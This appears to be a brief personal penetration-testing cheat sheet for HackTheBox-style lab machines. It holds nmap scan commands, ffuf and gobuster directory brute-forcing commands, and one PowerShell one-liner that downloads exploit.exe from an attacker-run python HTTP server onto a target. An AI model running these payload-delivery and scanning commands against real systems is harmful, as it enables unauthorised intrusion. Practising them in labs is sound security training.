# sheet sheat

```shell
invoc file with powershell after created a python server ( python3 -m http.server) powershell "(new-object System.Net.WebClient).Downloadfile('[http://10.10.14.17:8000/exploit.exe](http://10.10.14.17:8000/exploit.exe)', 'exploit.exe')"

nmap -sC -sV -Pn -oA nmap/bounty 10.10.10.93

nmap -sC -sV -p- -T5 10.129.37.123

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://eforenzics.htb/assets/FUZZ.jpg

ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://eforenzics.htb/assets/FUZZ.jpg -mc all -fs 0,16 -c 404


gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u http://eforenzics.htb/assets/imgs/


gobuster --url [http://10.10.10.93](http://10.10.10.93/)/ dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50

gobuster --url [http://10.10.10.93/](http://10.10.10.93/) dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x aspx
```
